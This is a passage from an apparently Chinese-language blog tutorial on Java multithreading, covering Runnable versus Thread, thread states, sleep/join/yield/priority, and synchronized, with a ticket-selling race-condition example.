class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Thread2</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Thread2</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;任务: &quot;</span> + name + <span class="hljs-string">&quot; 值 &quot;</span> + i);<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在main中启动，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Thread2</span> <span class="hljs-variable">thread21</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread2</span>(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-type">Thread2</span> <span class="hljs-variable">thread22</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread2</span>(<span class="hljs-string">&quot;B&quot;</span>);<br>        <span class="hljs-type">Thread2</span> <span class="hljs-variable">thread23</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread2</span>(<span class="hljs-string">&quot;C&quot;</span>);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(thread21).start();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(thread22).start();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(thread23).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">任务: A 值 0</span><br><span class="hljs-section">任务: B 值 0</span><br><span class="hljs-section">任务: C 值 0</span><br><span class="hljs-section">任务: A 值 1</span><br><span class="hljs-section">任务: B 值 1</span><br><span class="hljs-section">任务: C 值 1</span><br><span class="hljs-section">任务: A 值 2</span><br><span class="hljs-section">任务: B 值 2</span><br><span class="hljs-section">任务: C 值 2</span><br><span class="hljs-section">任务: A 值 3</span><br><span class="hljs-section">任务: B 值 3</span><br><span class="hljs-section">任务: C 值 3</span><br><span class="hljs-section">任务: B 值 4</span><br><span class="hljs-section">任务: A 值 4</span><br><span class="hljs-section">任务: C 值 4</span><br></code></pre></td></tr></table></figure><p>Thread2类通过实现Runnable接口，使得该类有了多线程类的特征。run（）方法是多线程程序的一个约定。所有的多线程代码都在run方法里面。Thread类实际上也是实现了Runnable接口的类。<br>在启动的多线程的时候，需要先通过Thread类的构造方法Thread(Runnable target) 构造出对象，然后调用Thread对象的start()方法来运行多线程代码。<br>实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的，熟悉Thread类的API是进行多线程编程的基础。</p><h3 id="Thread和Runnable的区别"><a href="#Thread和Runnable的区别" class="headerlink" title="Thread和Runnable的区别"></a>Thread和Runnable的区别</h3><p>如果一个类继承Thread，则不适合资源共享。但是如果实现了Runable接口的话，则很容易的实现资源共享。</p><p>实现Runnable接口比继承Thread类所具有的优势：</p><ol><li>适合多个相同的程序代码的线程去处理同一个资源</li><li>可以避免java中的单继承的限制</li><li>增加程序的健壮性，代码可以被多个线程共享，代码和数据独立</li><li>线程池只能放入实现Runable或callable类线程，不能直接放入继承Thread的类</li></ol><p>在java中所以的线程都是同时启动的，至于什么时候，哪个先执行，完全看谁先得到CPU的资源。</p><h3 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h3><p>一个线程的状态变化：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20150309140927553" alt="img"></p><p>之前说线程有5个阶段，</p><ol><li>新建状态（New）：新创建了一个线程对象。</li><li>就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。</li><li>运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码。</li><li>阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：<ul><li>等待阻塞：运行的线程执行wait()方法，JVM会把该线程放入等待池中。(wait会释放持有的锁)</li><li>同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入锁池中。</li><li>他阻塞：运行的线程执行sleep()或join()方法，或者发出了I&#x2F;O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I&#x2F;O处理完毕时，线程重新转入就绪状态。（注意,sleep是不会释放持有的锁）</li></ul></li><li>死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</li></ol><h3 id="线程调度"><a href="#线程调度" class="headerlink" title="线程调度"></a>线程调度</h3><blockquote><p>常见的线程调度模型：</p><ul><li>抢占式调度<br>哪个线程的优先级比较高，抢到的CPU时间片的概率就高一些&#x2F;多一些。<br>java采用的就是抢占式调度模型。</li><li>均分式调度<br>平均分配CPU时间片。每个线程占有的CPU时间片时间长度一样。</li></ul></blockquote><p>java中对线程进行调度，可能改变线程状态的一些方法：</p><ol><li><p>调整线程优先级：Java线程有优先级，优先级高的线程会获得较多的运行机会。Java线程的优先级用整数表示，取值范围是1~10，Thread类有以下三个静态常量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-type">int</span> MAX_PRIORITY<br><span class="hljs-comment">// 线程可以具有的最高优先级，取值为10。</span><br><span class="hljs-keyword">static</span> <span class="hljs-type">int</span> MIN_PRIORITY<br><span class="hljs-comment">// 线程可以具有的最低优先级，取值为1。</span><br><span class="hljs-keyword">static</span> <span class="hljs-type">int</span> NORM_PRIORITY<br><span class="hljs-comment">// 分配给线程的默认优先级，取值为5。</span><br></code></pre></td></tr></table></figure><p>Thread类的<code>setPriority()</code>和<code>getPriority()</code>方法分别用来设置和获取线程的优先级。每个线程都有默认的优先级。主线程的默认优先级为<code>Thread.NORM_PRIORITY</code>。线程的优先级有继承关系，比如A线程中创建了B线程，那么B将和A具有相同的优先级。</p></li><li><p>线程睡眠：<code>Thread.sleep(long millis)</code>方法，使线程转到阻塞状态。millis参数设定睡眠的时间，以毫秒为单位。当睡眠结束后，就转为就绪（Runnable）状态。sleep()平台移植性好。</p></li><li><p>线程等待：Object类中的<code>wait()</code>方法，导致当前的线程等待，直到其他线程调用此对象的 <code>notify()</code> 方法或 <code>notifyAll()</code> 唤醒方法。这个两个唤醒方法也是Object类中的方法，行为等价于调用 <code>wait(0)</code> 一样。</p></li><li><p>线程让步：<code>Thread.yield()</code> 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。<code>yield()</code>方法的执行会让当前线程从“运行状态”回到“就绪状态”。在回到就绪之后，<strong>有可能还会再次抢到</strong>。</p></li><li><p>线程加入：<code>join()</code>方法，等待其他线程终止。在当前线程中调用另一个线程的<code>join()</code>方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。</p></li><li><p>线程唤醒：Object类中的<code>notify()</code>方法，唤醒在此对象监视器上等待的单个线程。如果所有线程都在此对象上等待，则会选择唤醒其中一个线程。选择是任意性的，并在对实现做出决定时发生。线程通过调用其中一个 <code>wait</code> 方法，在对象的监视器上等待。 直到当前的线程放弃此对象上的锁定，才能继续执行被唤醒的线程。被唤醒的线程将以常规方式与在该对象上主动同步的其他所有线程进行竞争；例如，唤醒的线程在作为锁定此对象的下一个线程方面没有可靠的特权或劣势。类似的方法还有一个<code>notifyAll()</code>，唤醒在此对象监视器上等待的所有线程。</p></li></ol><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="currentThread"><a href="#currentThread" class="headerlink" title="currentThread"></a><code>currentThread</code></h4><p><code>static Thread currentThread()</code>获取当前线程对象。</p><h4 id="getName"><a href="#getName" class="headerlink" title="getName"></a><code>getName</code></h4><p><code>String getName()</code>获取线程对象名字</p><h4 id="setName"><a href="#setName" class="headerlink" title="setName"></a><code>setName</code></h4><p><code>void setName(String name)</code>修改线程对象名字</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a><code>sleep</code></h4><p><code>static void sleep(long millis)</code>让当前线程休眠一定毫秒，线程会进入阻塞状态，放弃占有CPU时间片，让给其它线程使用。</p><h4 id="join"><a href="#join" class="headerlink" title="join"></a><code>join</code></h4><p>join是Thread类的一个方法，启动线程后直接调用，即join()的作用是：“等待该线程终止”，这里需要理解的就是该线程是指的主线程等待子线程的终止。也就是在子线程调用了join()方法后面的代码，只有等到子线程结束了才能执行。</p><p>在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。</p><p>不使用<code>join</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadJoin</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadJoin1</span>());<br>        thread.start();<br>        System.out.println(<span class="hljs-string">&quot;主线程执行.&quot;</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadJoin1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;执行子线程...&quot;</span>);<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>            System.out.println(<span class="hljs-string">&quot;子线程执行完成.&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">主线程执行.<br>执行子线程...<br>子线程执行完成.<br></code></pre></td></tr></table></figure><p>使用<code>join</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadJoin</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadJoin1</span>());<br>        thread.start();<br>        thread.join();<br>        System.out.println(<span class="hljs-string">&quot;主线程执行.&quot;</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadJoin1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;执行子线程...&quot;</span>);<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>            System.out.println(<span class="hljs-string">&quot;子线程执行完成.&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">执行子线程...<br>子线程执行完成.<br>主线程执行.<br></code></pre></td></tr></table></figure><h4 id="yield"><a href="#yield" class="headerlink" title="yield"></a><code>yield</code></h4><p><code>Thread.yield()</code>方法作用是：暂停当前正在执行的线程对象，并执行其他线程。</p><p><code>yield()</code>应该做的是让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。</p><p><code>yield()</code>从未导致线程转到等待&#x2F;睡眠&#x2F;阻塞状态。在大多数情况下，yield()将导致线程从运行状态转到可运行状态，但有可能没有效果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadYield</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadYield1</span>(<span class="hljs-string">&quot;A&quot;</span>));<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadYield1</span>(<span class="hljs-string">&quot;B&quot;</span>));<br>        thread1.start();<br>        thread2.start();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadYield1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ThreadYield1</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ThreadYield1</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            System.out.println(name + <span class="hljs-string">&quot; 执行中.. &quot;</span> + i);<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">50</span>)&#123;<br>                Thread.yield();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果输出：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">...</span><br>B 执行中<span class="hljs-string">..</span> 38<br>A 执行中<span class="hljs-string">..</span> 46<br>A 执行中<span class="hljs-string">..</span> 47<br>A 执行中<span class="hljs-string">..</span> 48<br>A 执行中<span class="hljs-string">..</span> 49<br>A 执行中<span class="hljs-string">..</span> 50<br>B 执行中<span class="hljs-string">..</span> 39<br>B 执行中<span class="hljs-string">..</span> 40<br>B 执行中<span class="hljs-string">..</span> 41<br><span class="hljs-string">...</span><br>B 执行中<span class="hljs-string">..</span> 38<br>A 执行中<span class="hljs-string">..</span> 46<br>A 执行中<span class="hljs-string">..</span> 47<br>A 执行中<span class="hljs-string">..</span> 48<br>A 执行中<span class="hljs-string">..</span> 49<br>A 执行中<span class="hljs-string">..</span> 50<br>B 执行中<span class="hljs-string">..</span> 39<br>B 执行中<span class="hljs-string">..</span> 40<br>B 执行中<span class="hljs-string">..</span> 41<br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>可以看到任务A执行到50时，被B抢到了执行权开始执行；但是B执行到50时，没有被A抢到执行权，仍然执行。</p><h4 id="sleep和yield的区别"><a href="#sleep和yield的区别" class="headerlink" title="sleep和yield的区别"></a><code>sleep</code>和<code>yield</code>的区别</h4><p>sleep()和yield()的区别):sleep()使当前线程进入停滞状态，所以执行sleep()的线程在指定的时间内肯定不会被执行；yield()只是使当前线程重新回到可执行状态，所以执行yield()的线程有可能在进入到可执行状态后马上又被执行。</p><p>sleep 方法使当前运行中的线程睡眼一段时间，进入不可运行状态，这段时间的长短是由程序设定的，yield 方法使当前线程让出 CPU 占有权，但让出的时间是不可设定的。实际上，yield()方法对应了如下操作：先检测当前是否有相同优先级的线程处于同可运行状态，如有，则把 CPU  的占有权交给此线程，否则，继续运行原来的线程。所以yield()方法称为“退让”，它把运行机会让给了同等优先级的其他线程。</p><p>另外，sleep 方法允许较低优先级的线程获得运行机会，但 yield()  方法执行时，当前线程仍处在可运行状态，所以，不可能让出较低优先级的线程些时获得 CPU 占有权。在一个运行系统中，如果较高优先级的线程没有调用 sleep 方法，又没有受到 I\O 阻塞，那么，较低优先级线程只能等待所有较高优先级的线程运行结束，才有机会运行。</p><h4 id="setPriority"><a href="#setPriority" class="headerlink" title="setPriority"></a><code>setPriority</code></h4><p><code>setPriority()</code>更改线程的优先级。优先级只是提升了概率，并不一定准确。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">thread.setPriority(<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><h2 id="多线程的数据安全"><a href="#多线程的数据安全" class="headerlink" title="多线程的数据安全"></a>多线程的数据安全</h2><p>如果使用多线程时有共享数据，且共享数据存在修改行为，那么就需要考虑数据的安全问题。如何解决这种问题？</p><p>线程排队执行，这种机制称为<strong>线程同步机制</strong>，这样就不能并发了，会牺牲一部分效率。毕竟<strong>数据最重要</strong>。</p><blockquote><p>异步就是并发。线程t1和线程t2，各自执行各自的，t1不管t2，t2不管t1，谁也不需要等谁，这种编程模型叫做：异步编程模型。</p><p>同步就是排队。线程t1和线程t2，在线程t1执行的时候，必须等待t2线程执行结束，或者说在t2线程执行的时候，必须等待t1线程执行结束，两个线程之间发生了等待关系，这就是同步编程模型。</p></blockquote><h3 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a><code>synchronized</code></h3><p>线程同步使用<code>synchronized</code>，synchronized关键字的作用域：</p><ol><li>某个对象实例内，<code>synchronized aMethod()&#123;&#125;</code>可以防止多个线程同时访问这个对象的synchronized方法（如果一个对象有多个synchronized方法，只要一个线程访问了其中的一个synchronized方法，其它线程不能同时访问这个对象中任何一个synchronized方法）。不同的对象实例的synchronized方法是不相干扰的。也就是说，其它线程照样可以同时访问相同类的另一个对象实例中的synchronized方法；</li><li>某个类的范围，<code>synchronized static aStaticMethod&#123;&#125;</code>防止多个线程同时访问这个类中的synchronized static 方法。它可以对类的所有对象实例起作用。</li><li>除了方法前用synchronized关键字，synchronized关键字还可以用于方法中的某个区块中，表示只对这个区块的资源实行互斥访问。用法是: <code>synchronized(this)&#123;/*区块*/&#125;</code>，它的作用域是当前对象；</li><li>synchronized关键字是不能继承的，也就是说，基类的方法<code>synchronized f()&#123;&#125;</code> 在继承类中并不自动是<code>synchronized f()&#123;&#125;</code>，而是变成了<code>f()&#123;&#125;</code>。继承类需要你显式的指定它的某个方法为synchronized方法；</li></ol><p>synchronized后面的“数据”是相当关键的。这个数据必须是 <strong><code>多线程共享</code></strong> 的数据。才能达到多线程排队。</p><p>假设有两个线程：</p><ol><li>假设t1和t2线程并发，开始执行以下代码的时候，肯定有一个先一个后。</li><li>假设t1先执行了，遇到了<strong>synchronized</strong>，这个时候自动找“后面<strong>共享对象</strong>”的<strong>对象锁</strong>，<br>找到之后，并<strong>占有这把锁</strong>，然后<strong>执行同步代码块</strong>中的程序，在程序执行过程中一直都是<br><strong>占有这把锁</strong>的。<strong>直到同步代码块代码结束，这把锁才会释放。</strong></li><li>假设t1已经占有这把锁，此时t2也遇到synchronized关键字，也会去占有后面<br>共享对象的这把锁，结果这把锁被t1占有，t2只能在同步代码块外面等待t1的结束，<br>直到t1把同步代码块执行结束了，t1会归还这把锁，此时t2终于等到这把锁，然后<br>t2占有这把锁之后，进入同步代码块执行程序。</li><li>这样就达到了<strong>线程排队</strong>执行。</li></ol><h3 id="多人抢票的例子"><a href="#多人抢票的例子" class="headerlink" title="多人抢票的例子"></a>多人抢票的例子</h3><p>设置这样的一个场景：火车站和黄牛ABC，黄牛都想尽可能的抢到票，三个人同时开始抢，直到票抢完。根据描述，需要两个类：火车站和黄牛；火车站保存票和检查票数量，黄牛抢票。</p><p>火车站类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 火车站</span><br><span class="hljs-comment">// 初始有10张票</span><br><span class="hljs-comment">// 有一个出票的方法，如果有票就出一张票；否在就失败</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Station</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">ticketNums</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-type">boolean</span> <span class="hljs-title function_">pullTick</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-keyword">if</span> (ticketNums &gt; <span class="hljs-number">0</span>)&#123;<br>            ticketNums--;<br>            System.out.println(name + <span class="hljs-string">&quot;取票  剩余票数: &quot;</span> + ticketNums);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>黄牛类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 黄牛类</span><br><span class="hljs-comment">// 一直在抢票，每次抢票间隔200ms</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySync</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Station</span> <span class="hljs-variable">station</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Station</span>();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">while</span> (station.pullTick(Thread.currentThread().getName())) &#123;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">200</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br><br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">MySync</span> <span class="hljs-variable">mySync</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySync</span>();<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(mySync, <span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(mySync, <span class="hljs-string">&quot;B&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 